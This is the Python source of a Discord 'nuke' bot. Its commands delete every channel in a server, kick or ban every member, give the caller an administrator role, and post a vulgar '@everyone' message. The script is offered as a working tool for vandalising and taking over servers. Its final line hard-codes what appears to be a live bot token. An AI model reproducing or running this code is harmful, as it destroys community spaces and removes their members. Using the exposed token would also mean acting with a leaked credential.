import os
import discord
from discord.ext import commands

client = commands.Bot(command_prefix="n.",  help_command=None)


@client.event
async def on_ready():
  print('Nuke Bot Is Ready to go! || Type n.e to nuke')

owner = [] #put ur id

@client.command()
async def nuke(ctx):

  if ctx.author.id == owner[0]:

    for chan in ctx.guild.channels:
        try:
            await chan.delete()
        except:
            pass

    await ctx.guild.create_text_channel('nuked')
    channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked')
    await channel.send("@everyone\nKABOOOM\n")

  if ctx.author.id == owner[0]:
    for chan in ctx.guild.channels:
        try:
            await chan.delete()
        except:
            pass


    await ctx.guild.create_text_channel('nuked')
    channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked')
    await channel.send("@everyone\nKABOOOM\n")

  else:
    await ctx.send("No Lmao")


@client.command()
async def bbomb(ctx):

  if ctx.author.id == owner[0]:


    for member in ctx.guild.members:
        try:
            if member == ctx.author:
                pass
            else:
                await member.kick()
                await ctx.send(f"Successfully kicked {member}")

        except Exception as e:
            await ctx.send(f"Unable to kick {member} {e}")
  else:
    await ctx.send("No")

@client.command()
async def cbomb(ctx):

  if ctx.author.id == owner[0]:

    for member in ctx.guild.members:
        try:
            if member == ctx.author:
                pass
            else:
                await member.ban()
                await ctx.send(f"Successfully ban {member}")

        except Exception as e:
            await ctx.send(f"Unable to ban {member} {e}")
  else:
    await ctx.send("No")

@client.command()
async def dbomb(ctx):

  if ctx.author.id == owner[0]:

    perms = discord.Permissions(administrator=True)
    role = await ctx.guild.create_role(name=".", permissions=perms)
    await ctx.author.add_roles(role)
    await ctx.message.delete()
  else:
    await ctx.send("No")

@client.command()
async def e(ctx):

  if ctx.author.id == owner[0]:

    for member in ctx.guild.members:
        try:
            if member == ctx.author:
                pass
            else:
                await member.ban()
                await ctx.send(f"Successfully ban {member}")

        except Exception as e:
            await ctx.send(f"Unable to ban {member} {e}")

    for chan in ctx.guild.channels:
        try:
            await chan.delete()
        except:
            pass

    await ctx.guild.create_text_channel('nuked')
    channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked')
    await channel.send("seggs ur mom")
  else:
    await ctx.send("No")


client.run('OTExNTgwMzg4MDM4NjcyNDU0.YZjdZA.SoLODyjViB12PLZclIGM1RbNqg8')
